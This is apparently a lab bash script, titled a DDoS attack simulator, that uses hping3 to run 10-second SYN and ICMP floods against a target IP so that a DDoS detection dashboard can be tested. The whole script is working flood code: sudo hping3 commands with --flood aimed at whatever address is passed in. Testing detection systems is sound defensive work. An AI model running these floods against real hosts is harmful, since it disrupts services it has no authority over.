#!/bin/bash
# DDoS Attack Simulator
# Usage: ./attack_ddos.sh <TARGET_IP> [ATTACK_TYPE]
# Attack types: syn, icmp, all (default: all)
#
# Requires: hping3 (sudo apt install hping3)

TARGET=${1:-"10.134.225.6"}
ATTACK=${2:-"all"}

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${RED}=========================================="
echo -e "   DDoS ATTACK SIMULATOR"
echo -e "==========================================${NC}"
echo -e "  Target : ${CYAN}$TARGET${NC}"
echo -e "  Attack : ${CYAN}$ATTACK${NC}"
echo ""

# Check for hping3
if ! command -v hping3 &> /dev/null; then
    echo -e "${RED}[!] hping3 is not installed.${NC}"
    echo "    Install: sudo apt install hping3"
    exit 1
fi

# ---- SYN Flood ----
run_syn_flood() {
    echo -e "${YELLOW}[*] PHASE: SYN Flood Attack${NC}"
    echo -e "    Sending rapid SYN packets to port 80..."
    echo -e "    Duration: 10 seconds"
    echo ""

    # --flood  : Send packets as fast as possible
    # -S       : Set SYN flag
    # -p 80    : Target port 80
    # --rand-source is NOT used (single source for detection)
    sudo timeout 10 hping3 -S --flood -p 80 "$TARGET" 2>/dev/null &
    FLOOD_PID=$!

    # Show countdown
    for i in $(seq 10 -1 1); do
        echo -ne "\r    ${GREEN}Running... ${i}s remaining${NC}  "
        sleep 1
    done
    echo ""

    sudo kill $FLOOD_PID 2>/dev/null
    wait $FLOOD_PID 2>/dev/null
    echo -e "    ${GREEN}SYN Flood complete.${NC}"
    echo ""
}

# ---- ICMP Flood (Ping Flood) ----
run_icmp_flood() {
    echo -e "${YELLOW}[*] PHASE: ICMP Flood (Ping Flood) Attack${NC}"
    echo -e "    Sending rapid ICMP echo requests..."
    echo -e "    Duration: 10 seconds"
    echo ""

    # --flood     : Send as fast as possible
    # --icmp      : ICMP mode
    # -1          : ICMP mode shorthand
    sudo timeout 10 hping3 --icmp --flood "$TARGET" 2>/dev/null &
    FLOOD_PID=$!

    for i in $(seq 10 -1 1); do
        echo -ne "\r    ${GREEN}Running... ${i}s remaining${NC}  "
        sleep 1
    done
    echo ""

    sudo kill $FLOOD_PID 2>/dev/null
    wait $FLOOD_PID 2>/dev/null
    echo -e "    ${GREEN}ICMP Flood complete.${NC}"
    echo ""
}

# ---- Execute ----
case $ATTACK in
    syn)
        run_syn_flood
        ;;
    icmp)
        run_icmp_flood
        ;;
    all)
        run_syn_flood
        sleep 2
        run_icmp_flood
        ;;
    *)
        echo -e "${RED}Unknown attack type: $ATTACK${NC}"
        echo "Available: syn, icmp, all"
        exit 1
        ;;
esac

echo -e "${RED}=========================================="
echo -e "   SIMULATION COMPLETE"
echo -e "==========================================${NC}"
echo -e "${GREEN}Check your dashboard for DDoS detection events!${NC}"
